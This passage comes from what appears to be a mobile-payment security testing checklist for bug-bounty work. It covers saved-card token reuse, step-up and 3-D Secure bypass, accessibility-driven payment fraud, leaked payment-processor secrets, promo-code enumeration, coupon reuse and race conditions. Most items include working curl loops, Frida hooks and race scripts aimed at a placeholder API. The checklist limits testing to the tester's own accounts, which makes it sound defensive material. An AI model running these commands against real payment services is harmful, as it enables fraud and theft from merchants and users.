|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control\|idor\|modify_view_sensitive_information_iterable_object_identifiers` (**P1**) |
| **Attacker** | AM-05 another user of the same app |
| **Applies to** | all apps that store payment instruments |
| **Maps to** | API1:2023-class object-level authorization (filed as BAC/IDOR); WSTG-BUSL-02; cross-user billing/subscription parameter tampering precedent H1 #394329 ($8,000) |

- **Test:** Two questions. Is the saved-card token scoped to its owning account server-side? And is a
  step-up (CVV, 3DS, biometric) demanded when a saved card is used from a brand-new device?
- **How:**
```bash
curl -s https://api.target/v1/payment-methods -H "Authorization: Bearer $A" | jq '.[].token,.[].id,.[].last4'
# use A's instrument from B's session
curl -s -X POST https://api.target/v1/orders/$O/pay -H "Authorization: Bearer $B" \
  -d '{"payment_method_token":"<A_TOKEN>"}' -i
# and the format question: are ids short, sequential, or guessable?
curl -s https://api.target/v1/payment-methods/$((ID-1)) -H "Authorization: Bearer $A" -i
# fresh install, A's own account: is a step-up demanded?
```
- **Proof:** A charge against account A's instrument placed from account B's session — the order under B
  beside the charge against A's card in the PSP view. Use only instruments you own on both sides;
  **never another person's card.**
- **Escalation:** If the token format is short or sequential this becomes mass fraud rather than a
  two-account demonstration — quantify the keyspace. -> D23-032 (the step-up half).
- **Ruled out when:** B's use of A's token returns a not-found/ownership error while A's identical request
  succeeds, and a saved card on a fresh device triggers a step-up. Keep both requests and the negative
  control with a non-existent token id.

### D23-032 · Step-up not bound to the transaction it authorises

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management\|authentication_bypass` (**P1**) |
| **Attacker** | AM-01 |
| **Applies to** | banking, wallet, brokerage and any app with a per-transaction biometric/PIN/OTP confirmation |
| **Maps to** | **MASWE-0023** ("Step-Up Not Bound to the Action: implementing a re-authentication challenge that is not tied to the specific transaction being approved, so a single approval can be reused for a different or modified action"; mitigation "Bind the Challenge to the Action … (e.g. transaction signing)"), MASWE-0025 (Lack of Non-Repudiation for Critical Actions), MASWE-0009; **MASTG-TEST-0327** (event-bound vs crypto-bound biometrics — the client-side half); MASVS-AUTH-1 |

- **Test:** Capture the artefact the app sends after the user approves, then replay it against a
  **modified** transaction (different amount, different payee) and against a **different** transaction
  entirely. If the approval is a boolean, a generic token, or a nonce not derived from the transaction
  parameters, the control is decorative.
- **How:**
```bash
# what does the approval carry?
grep -rnE 'BiometricPrompt|CryptoObject|setUserAuthenticationRequired|signature|nonce|challenge|
transactionSigning|attestation' jadx_out/sources -A6 | grep -iE 'pay|transfer|txn|confirm'
# replay against modified parameters
curl -i -X POST https://api.target/v1/transfers -H "Authorization: Bearer $T" \
  -d '{"to":"ATTACKER","amount":5000,"approval":"<captured artefact>"}'
# and against a different transaction id entirely
curl -i -X POST https://api.target/v1/transfers/$OTHER/confirm -H "Authorization: Bearer $T" \
  -d '{"approval":"<same artefact>"}'
```
  Then hook the local success path and see whether the resulting request carries anything biometric at
  all:
```javascript
Java.perform(function(){
  var C = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');
  C.onAuthenticationSucceeded.implementation = function(r){ console.log('[bio] success'); return this.onAuthenticationSucceeded(r); };
});
```
- **Proof:** The server executing a transaction whose parameters differ from the ones the user approved —
  the approved transaction's screenshot beside the executed transaction's server record. A completed
  transfer whose request contains **no** field derived from the biometric event is the static half of the
  same finding.
- **Escalation:** -> D13 (event-bound biometric bypass) to hook the approval to succeed, then replay
  across transactions; -> D23-033 for the platform answer.
- **Ruled out when:** The approval artefact is a signature over the transaction parameters (change one
  byte of the amount and the server rejects it) produced by a Keystore key with
  `setUserAuthenticationRequired(true)` and a per-operation `CryptoObject`. Demonstrate the rejection on a
  mutated amount — that is the ruling-out, not the presence of a `BiometricPrompt`.

### D23-033 · Money-moving action not bound to a user-presence-verified key (Protected Confirmation)

| | |
|---|---|
| **Severity ceiling** | Critical (for money movement); Medium as a design gap where the amounts are small |
| **VRT** | `cryptographic_weakness\|insecure_implementation\|missing_cryptographic_step` (**VARIES**, CWE-325); the consequence files as `broken_authentication_and_session_management\|authentication_bypass` (**P1**) |
| **Attacker** | AM-03 local app with a driving primitive; AM-12 to demonstrate |
| **Applies to** | **Android 9+ for Protected Confirmation, and it is hardware-dependent** — say so; the underlying finding (an on-device attacker can drive the authorisation path) applies everywhere |
| **Maps to** | AOSP security-model §4.3.8 — apps "can tie usage of a key stored in Keymint or Strongbox to the user confirming that they have seen a message displayed on the screen by pushing a physical button … even a full kernel compromise (without user cooperation) cannot lead to creating these signed confirmations"; Keystore tags `TAG_TRUSTED_CONFIRMATION_REQUIRED`, `TAG_TRUSTED_USER_PRESENCE_REQUIRED`; MASWE-0025 |

- **Test:** Whether the "confirm payment" step is a plain dialog plus an ordinary key, or a TEE-displayed
  message whose hash the backend verifies. The first has no defence against an on-device attacker.
- **How:**
```bash
grep -rnE 'ConfirmationPrompt|ConfirmationCallback|setUserConfirmationRequired|
TRUSTED_CONFIRMATION|setUserAuthenticationRequired|setInvalidatedByBiometricEnrollment' jadx_out/sources
adb shell pm list features | grep -i confirmation
```
  Then drive the authorisation code path from Frida or from an IPC entry point with no user interaction
  and see whether the server accepts the result.
- **Proof:** A server-accepted authorisation produced with no user interaction — the request, the server
  record of the transaction, and a screen recording showing that nothing was tapped.
- **Escalation:** -> D23-034 (overlay + accessibility is the realistic delivery), -> D12 for the Keystore
  configuration.
- **Ruled out when:** The authorisation carries a signature over the displayed message produced under
  `TAG_TRUSTED_CONFIRMATION_REQUIRED`, and driving the path programmatically yields no valid signature.
  State the hardware dependency: on a device without the feature, record it as not established rather than
  as absent.

### D23-034 · High-risk flow fully automatable: overlay plus accessibility drives the payment

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management\|authentication_bypass` (**P1**) for the completed unauthorised transaction; the overlay component alone is `mobile_security_misconfiguration\|tapjacking` (**P5**) and must never be the headline |
| **Attacker** | AM-04 local app with one common permission (the accessibility grant is user-facing and social-engineered; say so) |
| **Applies to** | banking, wallet and brokerage apps |
| **Maps to** | **MASWE-0040** ("High-Risk Flows Fully Automatable: designing sensitive flows (e.g. payments) so that they can be completed entirely through programmatic UI interaction without any additional verification"; mitigation "Add Friction to High-Risk Flows: require verification that UI automation cannot satisfy (e.g. biometric-bound confirmation)"), MASWE-0039; **MASTG-TEST-0340**; ATT&CK **T1516** Input Injection (ATT&CK's own example: "Mimicking user clicks to commit fraud (e.g., stealing from PayPal accounts)"; detection DET0612/AN1666 — "programmatic clicks, global actions, or text insertion into another app's active UI, especially when those actions occur without matching user touch interaction", strengthened when "followed by target-app navigation, form submission, transaction progression, or network activity"), T1417.002, T1453 |

- **Test:** Whether the payment confirmation can be completed end to end by programmatic UI interaction.
  This is the on-device-fraud model, and it is the correct impact framing for any overlay/accessibility
  finding against a financial app — the device-bound MFA is satisfied because it is the same device.
- **How:** Combine the D04 overlay harness with a D20/D25 accessibility service:
```java
AccessibilityNodeInfo n = findByViewId("com.target:id/btn_confirm");
n.performAction(AccessibilityNodeInfo.ACTION_CLICK);
// plus performGlobalAction(...) and dispatchGesture(...) for the rest of the flow
```
```bash
adb shell settings put secure enabled_accessibility_services com.attacker/.DriverService
adb shell screenrecord --time-limit 90 /sdcard/poc.mp4 && adb pull /sdcard/poc.mp4
```
- **Proof:** A recorded session on a **test account** showing the transfer completed with the decoy on
  screen, paired with the server-side transaction record and the in-app history entry. Frame the report
  as fraud automation, not as tapjacking.
- **Escalation:** -> D04, -> D23-032/D23-033 (the defence to demand is a transaction-signing step bound to
  a Keystore key with `setUserAuthenticationRequired(true)` and a per-operation `CryptoObject`).
- **Ruled out when:** The confirmation step requires something UI automation cannot satisfy — a
  biometric-bound `CryptoObject` signature, or a Protected Confirmation — and the automated run stalls at
  that step. Record the stall, and note separately whether `FLAG_SECURE`/`setFilterTouchesWhenObscured`
  is set, which is hardening rather than a control.

### D23-035 · 3-D Secure / SCA challenge outcome asserted by the client

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management\|authentication_bypass` (**P1**) |
| **Attacker** | AM-01 |
| **Applies to** | apps taking card payments under EU/UK/IN SCA regimes, and any app with a step-up WebView |
| **Maps to** | MASWE-0023 (step-up not bound to the action); WSTG-BUSL-02; API3:2023 |

- **Test:** Card step-up is almost always a `WebView` on Android. Two questions: does the app decide
  "authentication succeeded" from the redirect URL it sees locally rather than from a server-side query to
  the PSP, and does the challenge WebView have file/universal-access settings that would let an injected
  page read the result?
- **How:**
```bash
grep -rniE 'threeDS|3ds|acsUrl|challengeUrl|ChallengeActivity|returnUrl|termUrl|cres|transStatus|
shouldOverrideUrlLoading|handleRedirect|onAuthenticationSuccess' jadx_out/sources -A6
grep -rnE 'setAllowFileAccessFromFileURLs|setAllowUniversalAccessFromFileURLs|setJavaScriptEnabled' jadx_out/sources
# assert success locally without completing the challenge
adb shell am start -a android.intent.action.VIEW -d 'targetapp://3ds/return?status=Y&transStatus=Y'
curl -s -X POST https://api.target/v1/payments/$P/3ds-result -H "Authorization: Bearer $T" \
  -d '{"transStatus":"Y"}' -i
```
- **Proof:** The payment authorised or captured after a locally-asserted success, with the PSP dashboard
  showing the challenge abandoned or failed. This defeats the exact control the regulation exists to
  impose and shifts liability — say so in one sentence.
- **Escalation:** Combine with D23-031 (a saved-card token usable from another account) for
  card-not-present fraud against saved instruments. -> D10 for the WebView settings half.
- **Ruled out when:** The backend queries the PSP for the challenge outcome and refuses the locally
  asserted `transStatus` — shown by the forged result being rejected while the real challenge completes
  the same payment.

### D23-036 · Google Pay `PaymentsClient` built on the client, and `ENVIRONMENT_TEST` in a release build

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269); the `PAN_ONLY` half is `insecure_data_transport\|cleartext_transmission_of_sensitive_data` (**VARIES**, CWE-319) only if it also leaves unprotected — otherwise rate on the integration defect |
| **Attacker** | AM-01 |
| **Applies to** | apps taking Google Pay |
| **Maps to** | Google Pay `WalletConstants.ENVIRONMENT_TEST` / `ENVIRONMENT_PRODUCTION`, `PaymentDataRequest`, `IsReadyToPayRequest`, `tokenizationSpecification`, `allowedAuthMethods` ∈ {`PAN_ONLY`, `CRYPTOGRAM_3DS`}; API3:2023 |

- **Test:** The Google Pay request is assembled on the device — gateway and merchant parameters, allowed
  auth methods, and the transaction amount. Three checks: does the release build run against the test
  environment, is the amount in the request the one the server charges, and do the allowed auth methods
  include `PAN_ONLY` where the integration claims tokenised-only?
- **How:**
```bash
grep -rnE 'PaymentsClient|Wallet\.getPaymentsClient|WalletConstants\.(ENVIRONMENT_TEST|ENVIRONMENT_PRODUCTION)|
PaymentDataRequest|IsReadyToPayRequest|allowedAuthMethods|PAN_ONLY|CRYPTOGRAM_3DS|
gatewayMerchantId|tokenizationSpecification|TransactionInfo|setTotalPrice' jadx_out/sources -A6
# and on the wire: does the server charge the client-supplied totalPrice, or re-derive it from the cart?
```
- **Proof:** `ENVIRONMENT_TEST` present in a **release** APK (extract from the store-distributed artefact,
  not from a debug flavour), or a captured flow where the server charges the client-supplied `totalPrice`
  rather than re-deriving it from the cart.
- **Escalation:** Feeds D23-021 with a concrete mobile mechanism. `PAN_ONLY` means the merchant receives a
  raw PAN — that changes the app's PCI posture and belongs in the report even when nothing else does.
- **Ruled out when:** The release build uses `ENVIRONMENT_PRODUCTION`, the `TransactionInfo` total is
  echoed back by the server from its own cart computation (change it and the capture is unchanged), and
  `allowedAuthMethods` matches the integration's documented claim.

### D23-037 · Test or sandbox payment instrument accepted in production

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `cryptographic_weakness\|key_reuse\|inter_environment` (**P2**) where a sandbox key is live against production; otherwise `broken_access_control\|privilege_escalation` (**VARIES**) |
| **Attacker** | AM-01 |
| **Applies to** | all apps with a PSP integration |
| **Maps to** | API3:2023; WSTG-BUSL-03 |

- **Test:** Whether the production build can be steered onto the PSP's sandbox — by a shipped test key, a
  flavour switch, a remote-config flag, or a debug menu — and whether a known PSP test instrument is
  accepted by the production order flow.
- **How:**
```bash
grep -rnE 'rzp_test_|pk_test_|sk_test_|sandbox|SANDBOX|TEST_MODE|isTestMode|ENVIRONMENT_TEST|
api\.sandbox\.|sandbox\.paypal|test\.adyen|apitest\.' jadx_out/sources jadx_out/res jadx_out/assets
grep -rniE 'BuildConfig\.(DEBUG|FLAVOR|BUILD_TYPE)' jadx_out/sources | grep -iE 'pay|psp|billing|env'
# is the switch reachable at runtime?
grep -rnE 'remoteConfig|getBoolean\("(test|sandbox|debug)' jadx_out/sources -A4
```
  Then, using **only the PSP's documented test instruments and your own account**, attempt an order on the
  production host. Do not use any real card; the RoE from D23-062 governs this item.
- **Proof:** A production order reaching `paid` with a documented PSP test instrument, and the PSP's
  production dashboard showing no settled funds — or the sandbox host reachable from the release build
  with the key shipped in the APK.
- **Escalation:** -> D18 (environment separation generally), -> D23-038 if the key found is a secret.
- **Ruled out when:** The release build carries only production keys and hosts, no runtime switch reaches
  the sandbox, and a test instrument is refused by the production order flow. Record the refusal — the
  absence of a sandbox string alone is not a negative because the switch can arrive by remote config.

### D23-038 · Payment-processor **secret** key shipped in the client

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure\|disclosure_of_secrets\|for_publicly_accessible_asset` (**P1**) |
| **Attacker** | AM-01 (anyone who downloads the APK) |
| **Applies to** | any app embedding a payment provider's credential |
| **Maps to** | CWE-798; public research summarised in the corpus — of ~13,000 apps analysed, ~250 used the Razorpay API and around 5% exposed both `key_id` and `key_secret`, sufficient to access transaction information and payment ids **and to carry out refunds**, framed as developer misuse rather than a provider flaw; Ostorlab's classification that Stripe and payment-related credentials must be server-delegated, never embedded |

- **Test:** Key **ids** are usually fine; **secrets** are not. Separate the two before writing anything,
  then prove liveness with one read-only call and stop.
- **How:**
```bash
grep -rnoE 'sk_(live|test)_[A-Za-z0-9]{16,}|rzp_(live|test)_[A-Za-z0-9]{10,}|pk_(live|test)_[A-Za-z0-9]{16,}|
key_secret|BraintreeClientToken|ADYEN_[A-Z_]*KEY|checkout_secret|-----BEGIN (RSA|EC|PRIVATE)' \
  jadx_out/sources jadx_out/res jadx_out/assets apktool_out | sort -u
# liveness, read-only, once:
curl -s https://api.stripe.com/v1/balance -u "$SK:" | head -c 300
curl -s -u "$KEY_ID:$KEY_SECRET" 'https://api.razorpay.com/v1/payments?count=1' | head -c 300
```
- **Proof:** A 200 with real payment or balance objects. **Stop there.** Do not issue refunds, do not
  mutate merchant state, do not enumerate customers. Redact all but the first and last six characters of
  the key in the report and keep the full value for the platform's private attachment channel.
- **Escalation:** A PSP secret also reads the customer object, which is a bulk-PII finding in its own
  right — state the capability, do not exercise it. This is usually the highest-paying single finding in
  the domain.
- **Ruled out when:** Every extracted credential is a documented **public** identifier (a Stripe
  publishable key, a Razorpay `key_id`, a Braintree tokenization key) — verify against the provider's own
  documentation and say which document — or the secret authenticates nowhere (a 401 on the read-only
  call), in which case file nothing, because `...|intentionally_public_sample_or_invalid` is **P5**.

### D23-039 · Hardcoded Basic credential for a production payment or vault host — the severity fork

| | |
|---|---|
| **Severity ceiling** | Critical if the credential alone suffices, High if it reaches an internal payment asset, hygiene (CWE-798) if the server also requires a session — **state the fork explicitly** |
| **VRT** | `sensitive_data_exposure\|disclosure_of_secrets\|for_publicly_accessible_asset` (**P1**) if it authenticates alone; `...\|for_internal_asset` (**P3**) if it reaches only an internal asset |
| **Attacker** | AM-01 |
| **Applies to** | all payment-integrated apps, especially card-vault/tokenisation integrations |
| **Maps to** | CWE-798; HackerOne Platform Standards on leaked credentials — hackers "should NOT test their validity beyond authenticating and then immediately deauthenticating" |

- **Test:** A `grep` hit is the *start*. Its value comes from tracing **which client sends it** and **what
  the endpoint does**. Two structural facts settle the band, and both come from code.
- **How:**
```bash
grep -rnE 'Basic [A-Za-z0-9+/=]{16,}' jadx_out/sources base_apktool/res base_apktool/assets
# (1) which OkHttp client carries it, and does that client add ANY identity interceptor?
grep -rn -B10 -A10 '<the literal>' jadx_out/sources
grep -rn 'OkHttpClient.Builder()\|addInterceptor(\|addNetworkInterceptor(' jadx_out/sources
# (2) what shape are the endpoints?  write-in/status-out is the dangerous shape:
#     tokenize(pan, ...) -> {status}      recache(token, cvv) -> {status}
```
  A vault client built with **null interceptors** — carrying no user identity, unlike a sibling client
  that adds e.g. `X-PAS-TOKEN` — means the credential is the only thing standing between the internet and
  the endpoint.
- **Proof:** The credential, the client construction showing no identity interceptor, and the endpoint
  signatures, all at `file:line`. Say plainly that static evidence cannot distinguish the two branches of
  the fork and that you did not test which is true.
- **Escalation:** Route it to **three questions the vendor can answer from their own logs** — is this
  credential sufficient alone, does the endpoint require a session, and what does the tokenize endpoint
  return on success? That is stronger than a test result, because it cannot be dismissed as unauthorised
  probing.
- **Ruled out when:** The same client demonstrably attaches a per-user token on every request to that
  host (quote the interceptor), and the credential is scoped to an asset with no payment capability.
  **Never test this by submitting a PAN** — see D23-063.

### D23-040 · Payment bridge methods reachable from a non-allow-listed WebView origin

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269); **P1** argued where the bridge moves money on the victim's session |
| **Attacker** | AM-02 remote one click |
| **Applies to** | apps with in-app payment WebViews; **minSdk < 17** additionally exposes the `addJavascriptInterface` reflection path |
| **Maps to** | CWE-927; MASVS-PLATFORM; disclosed calibration: a bridge proxying authenticated API calls in an exchange app — note that the platform initially rated it low and the researcher had to contest it, settling at CVSS 4.3, so **lead with the money, not the mechanism** |

- **Test:** Payment bridges (`initiateTxn`, `getTxnParams`, `pay`, `signTransaction`) reachable from a
  frame the origin allow-list does not cover let an attacker page initiate or observe transactions with
  the victim's session.
- **How:** Enumerate every bridge method and rate the bridge by what each method **returns**, then check
  the per-call origin guard on **every variant** — the common defect is a guard on the main frame only,
  with a cross-origin iframe reaching the same object.
```bash
grep -rn 'addJavascriptInterface\|@JavascriptInterface\|WebViewAssetLoader\|shouldInterceptRequest' jadx_out/sources -A10
grep -rniE 'initiateTxn|getTxnParams|startPayment|requestPayment|signTransaction|getAuthToken' jadx_out/sources
```
```html
<iframe src="https://target-allowlisted.example/"></iframe>
<script>/* from the attacker frame */ console.log(window.NativePay && NativePay.getTxnParams());</script>
```
- **Proof:** A call to `getTxnParams()` (or equivalent) from an attacker-influenced frame returning
  transaction parameters, or an order/transfer appearing in the victim's account history that the victim
  did not initiate.
- **Escalation:** -> D10 for the bridge surface, -> D23-021 for price tampering with the recovered
  parameters.
- **Ruled out when:** The guard is evaluated per call against the **current frame's** origin (not the
  WebView's last committed URL), and the iframe probe returns `undefined` for every payment method.
  Enumerate the whole bridge table — one guarded method proves nothing about the others.

### D23-041 · Payment `PendingIntent` replay and misrouting

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) |
| **Attacker** | AM-03 zero-permission local app |
| **Applies to** | **targetSdk < 31**: `PendingIntent` mutability is unenforced, so a mutable implicit `PendingIntent` is the default hazard — state the level |
| **Maps to** | `risks/pending-intent`; AOSP `PendingIntent.java`; CWE-927 |

- **Test:** Two defects, both against the payment flow specifically: a missing `FLAG_ONE_SHOT` on a
  "confirm payment" `PendingIntent` yields replay, and a constant `requestCode` across orders yields
  misrouting — confirming order A charges order B.
- **How:**
```bash
grep -rn -B10 'PendingIntent\.get\(Activity\|Broadcast\|Service\)' jadx_out/sources \
  | grep -inE 'pay|order|checkout|charge|transfer|confirm|refund'
grep -rn 'FLAG_ONE_SHOT\|FLAG_IMMUTABLE\|FLAG_MUTABLE\|FLAG_UPDATE_CURRENT' jadx_out/sources
```
  Then capture the `PendingIntent` from an exported surface and fire it N times, and separately create two
  orders and observe whether the second confirmation lands on the first order.
- **Proof:** N charges from one confirmation, or a confirmation applied to the wrong order — evidenced in
  the backend transaction list, not the UI.
- **Escalation:** -> D08 (`PendingIntent` surface generally).
- **Ruled out when:** The payment `PendingIntent` is created with `FLAG_ONE_SHOT|FLAG_IMMUTABLE` and a
  per-order `requestCode`, **and** a replay attempt returns `PendingIntent.CanceledException` — show the
  exception, not the flag constant.

### D23-042 · Promo, voucher and gift-code enumeration through the mobile API

| | |
|---|---|
| **Severity ceiling** | High (Medium where the discount is trivial) |
| **VRT** | `server_security_misconfiguration\|no_rate_limiting_on_form\|registration` is **not** the right node; file as `broken_access_control\|privilege_escalation` (**VARIES**) and carry the rating with the face value × discovery rate |
| **Attacker** | AM-01 |
| **Applies to** | all apps with promo, voucher, referral or gift codes |
| **Maps to** | H1 **#125707** (Uber — promotion-code enumeration and brute force in a mobile app, Medium, **$3,000**); API6:2023; WSTG-BUSL-05 |

- **Test:** The mobile promo endpoint frequently lacks the rate limiting on the web equivalent, and the
  code space is small. The finding is a three-signature response oracle plus an absent throttle.
- **How:**
```bash
# 1. establish the taxonomy on known inputs
curl -s -o /dev/null -w '%{http_code} %{size_download} INVALID\n' -X POST https://api.target/v1/promo \
  -H "Authorization: Bearer $T" -d '{"code":"ZZZZ9999"}'
curl -s -o /dev/null -w '%{http_code} %{size_download} USED\n'    -X POST https://api.target/v1/promo \
  -H "Authorization: Bearer $T" -d '{"code":"<known used>"}'
curl -s -o /dev/null -w '%{http_code} %{size_download} VALID\n'   -X POST https://api.target/v1/promo \
  -H "Authorization: Bearer $T" -d '{"code":"<known valid>"}'
# 2. measure the throttle before enumerating, and COUNT THE RESULTS
for c in $(seq -f "PROMO%04g" 1 500); do
  curl -s -o /dev/null -w "%{http_code} %{size_download} $c\n" -X POST https://api.target/v1/promo \
    -H "Authorization: Bearer $T" -d "{\"code\":\"$c\"}"
done | tee /tmp/promo.out | sort | uniq -c -w3
wc -l /tmp/promo.out          # never trust a loop you did not count
```
  `ffuf` is the faster form: `-w codes.txt -mc 200 -t 30` against the same body.
- **Proof:** Three distinct response signatures (status, body size, or timing) separating invalid /
  already-used / accepted, a 500-of-500 success rate showing no throttle, and **one code you discovered
  applied to your own account**. Quantify: codes found per hour × face value.
- **Escalation:** -> D23-043 (redeem the discovered code twice), -> D23-045 (race it before the owner
  burns it), -> D15 for the rate-limit sweep across the rest of the API.
- **Ruled out when:** All three probes return byte-identical responses after normalisation **and** the
  500-request run shows a throttle engaging with a consistent 429 boundary. Sample at least 100 attempts
  before claiming a throttle is absent, and distinguish per-IP from per-account from per-session — a
  single burst proves nothing.

### D23-043 · One-time incentive reused: coupon, fee waiver, referral credit

| | |
|---|---|
| **Severity ceiling** | Critical when a refund settles to your instrument; High when the impact is free goods only |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) for the sequential form; `server_security_misconfiguration\|race_condition` (**VARIES**) for the parallel form |
| **Attacker** | AM-01 |
| **Applies to** | commerce and fintech |
| **Maps to** | disclosed: a fee discount redeemable many times (H1 **#1849626**, **$5,000**); redeeming gift cards multiple times (H1 **#759247**); WSTG-BUSL-05; API6:2023 |

- **Test:** No server-side idempotency on a single-use benefit. **Run ten sequential redemptions before
  any parallel work** — if they all credit, it is a logic bug with a different fix (unique constraints,
  atomic transactions) and a different framing, not a race.
- **How:**
```bash
# sequential first — this decides the class
for i in $(seq 1 10); do
  curl -s -o /dev/null -w '%{http_code} ' -X POST https://api.target/v1/promo/redeem \
    -H "Authorization: Bearer $T" -d '{"code":"VALID10"}'
done; echo
curl -s https://api.target/v1/cart -H "Authorization: Bearer $T" | jq '.discount,.total'
# stacking: all supposedly-exclusive codes in one body
curl -i -X POST https://api.target/v1/promo/redeem -H "Authorization: Bearer $T" \
  -d '{"codes":["SUMMER20","FIRSTORDER","LOYAL10","NEWCUSTOMER","FREESHIP"]}'
# then parallel (single-packet) only if the sequential run was refused
seq 1 20 | xargs -P20 -I{} curl -s -o /dev/null -w '%{http_code} ' -X POST \
  https://api.target/v1/promo/redeem -H "Authorization: Bearer $T" -d '{"code":"VALID10"}'
```
- **Proof:** The discount **settling at checkout**, not merely appearing in the cart. The false-positive
  trap is explicit: many systems silently cap the applied discount at 100% — the cart shows `-$50.00`
  while the captured payment is `$0.00` and no refund issues. Free goods is one impact; free goods **plus
  a refund to your instrument** is a bigger one. Document which actually happened.
- **Escalation:** -> D23-045 for the parallel variant filed as a race, -> D23-044 for the referral shape.
- **Ruled out when:** The second sequential redemption is refused, the batch body applies at most one
  code, and the captured payment matches the single-discount total. Show the capture.

### D23-044 · Referral self-redemption and referral farming

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) |
| **Attacker** | AM-01 |
| **Applies to** | any app with a referral, invite or "refer a friend" credit |
| **Maps to** | WSTG-BUSL-05; API6:2023; the referral self-redemption pattern in the business-logic corpus |

- **Test:** Three variants, cheapest first: make yourself your own referrer; claim the bonus on both sides
  of a self-referral; and farm the bonus by multiplying installs rather than accounts.
- **How:**
```bash
# 1. self-referral at signup
curl -i -X POST https://api.target/v1/signup -H 'Content-Type: application/json' \
  -d '{"email":"a2@test.tld","password":"…","referrer_id":"<my own user id>","referral_code":"<my own code>"}'
# 2. does the referrer get credited before the referee completes the qualifying action?
curl -s https://api.target/v1/wallet/balance -H "Authorization: Bearer $T"
# 3. does the bonus key on the account, the device, or the install?
grep -rnE 'referr|invite|ANDROID_ID|AdvertisingIdClient|FirebaseInstallations|installReferrer|
InstallReferrerClient|getInstallReferrer' jadx_out/sources -A4
```
  The Play Install Referrer is a client-readable, client-forwardable value — check whether the server
  takes attribution from it.
- **Proof:** Credit landing in one account from a referral chain with one real human in it, with the
  balance before and after; or the same bonus credited N times from N installs on one physical device
  (see D23-014 for the install-multiplication mechanics).
- **Escalation:** -> D23-014 (Private Space / work profile / OEM clone), -> D23-048 if the credit is
  withdrawable rather than spend-only.
- **Ruled out when:** The signup rejects a self-referral, the bonus is withheld until the referee
  completes a qualifying paid action, and the referral is keyed on the account rather than the install.
  Demonstrate the withholding with a real second account, not by reading the code.

### D23-045 · Redemption and checkout races — single-packet, with a sequential baseline and a ledger read

| | |
|---|---|
| **Severity ceiling** | Critical by the ledger delta; High where the overrun is bounded and small |
| **VRT** | `server_security_misconfiguration\|race_condition` (**VARIES**) |
| **Attacker** | AM-01 |
| **Applies to** | all stateful money and incentive endpoints — coupon redemption, gift-card burn, wallet withdrawal, refund, top-up confirmation, one-time top-ups, binder-exposed local redemption paths |
| **Maps to** | PortSwigger *Smashing the state machine* (single-packet attack; predict collisions, probe with synchronised batches against a sequential baseline, isolate to two requests, automate retries); disclosed: gift cards redeemed multiple times (H1 **#759247**), limit-bypass races (H1 **#2110030** $3,000; **#1438052** $5,000; **#1520931** $4,000; **#2078571** $2,480; **#119657** $2,000); WSTG-BUSL-05 |

- **Test:** Check-then-act windows on any "you may do this once" control. The discipline is what makes it
  reportable: **sequential baseline first, parallel second, ledger read-back third.**
- **How:**
```bash
# 1. SEQUENTIAL BASELINE (10 requests). If they all succeed, it is a logic bug, not a race — go to D23-043.
for i in $(seq 1 10); do curl -s -o /dev/null -w '%{http_code} ' -X POST "$EP" \
  -H "Authorization: Bearer $T" -H 'Content-Type: application/json' -d "$BODY"; done; echo
# 2. PARALLEL: Burp tab group -> "Send group in parallel (single-packet attack)" is the reference method
```
```python
# Turbo Intruder, for volume
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30,
                           requestsPerConnection=10, pipeline=False)
    for i in range(30):
        engine.queue(target.req, str(i), gate='race1')
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```
```bash
# 3. LEDGER READ-BACK — this is the finding, not the status codes
curl -s https://api.target/v1/wallet/balance -H "Authorization: Bearer $T"
curl -s "https://api.target/v1/transactions?limit=50" -H "Authorization: Bearer $T" | jq '[.[].amount] | add'
```
  The local variant matters too: a binder-exposed redemption method is genuinely concurrent because of the
  binder thread pool — 32 threads against the exported service method.
- **Proof:** A **ledger effect** — balance, count, membership — not N×200. Show the arithmetic: starting
  balance, number of successful redemptions, the sum they should have cost, and the ending balance. Races
  reproduce 1/10 or 2/100; logic bugs reproduce 1/1, and saying which you have is what survives triage.
- **Escalation:** -> D23-047 (refund race), -> D23-048 (withdrawal race). If a race does not reproduce,
  retry with a long delay to catch **deferred** collisions driven by background batch jobs.
- **Ruled out when:** Exactly one request succeeds in the parallel run across at least three attempts, and
  the ledger equals the single-redemption value. Report the status distribution per attempt, not one run.

### D23-046 · Loyalty, points and in-app-currency ledgers: negative, fractional, over-balance

| | |
|---|---|
| **Severity ceiling** | Critical when points convert to cash or wallet balance; High for spend-only points |
| **VRT** | `broken_access_control\|privilege_escalation` (**VARIES**, CWE-269) |
| **Attacker** | AM-01 |
| **Applies to** | all apps with points, credits, wallet balance or in-app currency |
| **Maps to** | T1641 Data Manipulation; API3:2023; WSTG-BUSL-03 |

- **Test:** Point ledgers are a bolt-on and lack the invariants the money ledger has. Four probes:
  negative redemption (which credits you), fractional/rounding abuse, redeeming more than the balance, and
  concurrent redemption of one balance.
- **How:**
```bash
curl -s -X POST https://api.target/v1/rewards/redeem -H "Authorization: Bearer $T" -d '{"points":-1000}' -i
curl -s -X POST https://api.target/v1/rewards/redeem -H "Authorization: Bearer $T" -d '{"points":0.0001}' -i
curl -s -X POST https://api.target/v1/rewards/redeem -H "Authorization: Bearer $T" -d '{"points":999999}' -i
seq 1 30 | xargs -P30 -I{} curl -s -o /dev/null -w '%{http_code}\n' \
  -X POST https://api.target/v1/rewards/redeem -H "Authorization: Bearer $T" -d '{"points":500}' | sort | uniq -c
curl -s https://api.target/v1/rewards/balance -H "Authorization: Bearer $T"
```
